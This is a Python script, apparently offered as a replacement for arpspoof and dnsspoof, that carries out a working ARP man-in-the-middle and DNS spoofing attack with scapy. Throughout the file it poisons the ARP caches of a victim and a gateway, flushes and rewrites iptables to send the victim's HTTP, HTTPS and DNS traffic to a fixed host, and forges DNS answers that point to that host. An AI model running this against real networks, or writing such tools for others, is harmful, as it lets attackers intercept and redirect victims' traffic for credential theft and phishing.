# -*- encoding: utf-8 -*-

import os
import threading
import sys
import argparse
import pdb
from scapy.all import *

#
#	ARPSpoofing and DNSPoisoning script.
#   I just want to replace tools like arpspoof and dnsspoof for a simple Python Script.
#

class ARPPoisoning(threading.Thread):
	"""
	Thread to start the ARP packet crafting and sending process.
	"""
	def __init__(self, srcAddress, dstAddress):
		"""
			Receive the source and destination address for the ARP packet.
		"""
		threading.Thread.__init__(self)
		self.srcAddress = srcAddress
		self.dstAddress = dstAddress
	
	def run(self):
		"""
			Every thread sends an ARP packet to the destination every second.
		"""		
		try:		
			arpPacket = ARP(pdst=self.dstAddress, psrc=self.srcAddress)
			send(arpPacket, verbose=False, loop=1, iface="eth0")
		except:
			print("Unexpected error:", sys.exc_info()[0])

class DNSSpoofing():
	"""
		This class will start the DNS Spoofing attack. 
	"""

	def __init__(self, interface, capFilter):
		"""
			Setup the values for the attack.
		"""
		self.interface = interface
		self.filter = capFilter

	def enableForwarding(self):
		"""
			The attacker machine needs to forward the packets between gateway and victim.
		"""
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

	def redirectionRules(self):
		"""
			IPTables rules to redirect the traffic to the specified destination.
			This is important to filter the DNS packets emitted by the gateway.
		"""
		#os.system("echo 0 > /proc/sys/net/ipv4/conf/"+self.interface+"/send_redirects")
		os.system("iptables --flush")
		os.system("iptables --zero")
		os.system("iptables --delete-chain")
		os.system("iptables -F -t nat")
		os.system("iptables --append FORWARD --in-interface eth0 --jump ACCEPT")
		os.system("iptables --table nat --append POSTROUTING --out-interface eth0 --jump MASQUERADE")
		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination 192.168.1.135")
		os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination 192.168.1.135")
		os.system("iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
		os.system("iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP")
		os.system("iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
		os.system("iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP")

		os.system("iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j DNAT --to 192.168.1.135")
		os.system("iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j DNAT --to 192.168.1.135")

	def cleanRules(self):
		"""
			Clean the IPTables rules.
		"""
		os.system("iptables --flush")	

	def disableForwarding(self):
		"""
			Disable the packet forwarding in this machine.
		"""
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

	def ShowOrPoisoning(self, packet):
		ipAddressTarget = "192.168.1.135"
		if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
			try:	
				requestIP = packet[IP]
				requestUDP = packet[UDP]
				requestDNS = packet[DNS]
				requestDNSQR = packet[DNSQR]
				if self.verbose:
					print('[+] Target Domain %s searched... ' %(packet.getlayer(DNS).qd.qname))
					print('[+] Crafting the DNS Packet with tht following settings: ')
					print('[+] IP Source: %s ' %(requestIP.dst))
					print('[+] IP Dest: %s ' %(requestIP.src))
					print('[+] Port Source: %s ' %(requestUDP.dport))
					print('[+] Port Dest: %s ' %(requestUDP.sport))
					print('[+] RRName: %s ' %(packet.getlayer(DNS).qd.qname))
					print('[+] RData: %s ' %(ipAddressTarget))
					print('[+] DNS Packet ID: %s ' %(requestDNS.id))

				responseIP = IP(src=requestIP.dst, dst=requestIP.src)
				responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
				responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = ipAddressTarget)
				responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
				answer = responseIP/responseUDP/responseDNS
				send(answer)
			except:
				print("Unexpected error:", sys.exc_info()[0])
				print("Exception...")
		else:
			print(packet.summary())

	def startAttack(self, verbose):
		"""
			Start the attack with the domains specified by command-line
		"""
		self.verbose = verbose
		try:
			self.cleanRules()
			self.enableForwarding()
			self.redirectionRules()
			sniff(iface=self.interface, filter=self.filter, prn=self.ShowOrPoisoning)
		except KeyboardInterrupt:
			raise
		except Exception as e:
			print(e)
			print("error...")
			self.disableForwarding()
			self.cleanRules()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="ARP-MITM and DNS-Spoofing Tool")
	parser.add_argument("-t", "--target", required=True, help="Victim IP Address")
	parser.add_argument("-g", "--gateway", required=True, default="192.168.1.1", help="Gateway IP Address")
	parser.add_argument("-v", "--verbose", required=False, default=False, help="Verbose")
	parser.add_argument("-i", "--interface", required=False, default="eth0", help="IFace to use.")
	parser.add_argument("-f", "--filter", required=False, default="udp port 53", help="Capture Filter.")
	
	args = parser.parse_args()
	dnsSpoof = DNSSpoofing(args.interface, args.filter)	
	
	gateway_ip = args.gateway
	victim_ip  = args.target
	victim = ARPPoisoning(gateway_ip, victim_ip)
	gateway = ARPPoisoning(victim_ip, gateway_ip)
	victim.setDaemon(True)
	gateway.setDaemon(True)
	victim.start()
	gateway.start()

	dnsSpoof.startAttack(args.verbose)
